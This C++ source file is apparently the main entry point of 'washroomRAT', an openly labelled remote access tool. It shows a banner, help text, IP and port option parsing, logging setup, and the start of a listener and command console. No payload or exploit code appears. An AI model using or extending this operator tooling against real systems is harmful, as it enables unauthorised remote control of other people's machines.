#include <getopt.h>

#include <cstdlib>
#include <iostream>
#include <string>

#include "controlpanel.cpp"
#include "listener.h"
#include "logging.h"

void
displayBanner ()
{
  std::cout << ANSIColors::CYAN << R"(
                  __                     
 _    _____ ____ / /  _______  ___  __ _ 
| |/|/ / _ `(_-</ _ \/ __/ _ \/ _ \/  ' \
|__,__/\_,_/___/_//_/_/  \___/\___/_/_/_/
                              RAT v)"
            << VERSION << ANSIColors::RESET << std::endl
            << R"(    Type 'help' for a list of commands
    Press 'Ctrl-D' to quit
    <https://www.github.com/ndachj/washroomRAT>)"
            << std::endl;
}

void
displayHelp ()
{
  std::cout << R"(usage: washroom [hv] [IP] [PORT]
a remote access tool (RAT) written in C++

options:
    -h    show this help message and exit
    -v    show verbose messages
    -i    specify the IP addess to bind to (default: 127.0.0.1)
    -p    specify the port to listen on (default: 5555)
  )" << std::endl;
}

int
main (int argc, char *argv[])
{
  std::string ip = "127.0.0.1"; // default ip addr
  unsigned short port = 5555;   // default port no.
  bool verbose = false;         // enable debug messages

  int opt;
  while ((opt = getopt (argc, argv, "hvi:p:")) != -1)
    {
      switch (opt)
        {
        case 'h':
          displayHelp ();
          return 0;
        case 'v':
          verbose = true;
          break;
        case 'i':
          ip = optarg;
          break;
        case 'p':
          port = std::atoi (optarg);
          break;
        default:
          std::cerr << "Try 'washroom -h' for more information." << std::endl;
          return 1;
        }
    }

  displayBanner ();

  // setup the Logger
  if (verbose)
    {
      // TODO: hide log msg in a file
      struct LoggerConfig config;
      config.logLevel = LogLevel::DEBUG;
      config.logFormat = "[{timestap}] [{level}] [Thread: {thread}] {message}";
      config.dateFormat = "%Y-%m-%d %H:%M:%S";
      Logging::basicConfig (config);
    }

  // washroomRAT
  listener::Listener listener (ip.c_str (), port);
  if (listener.start () == 0)
    {
      Washroom wsr;
      wsr.commandMode ();
    }
  listener.stop ();
  return 0;
}
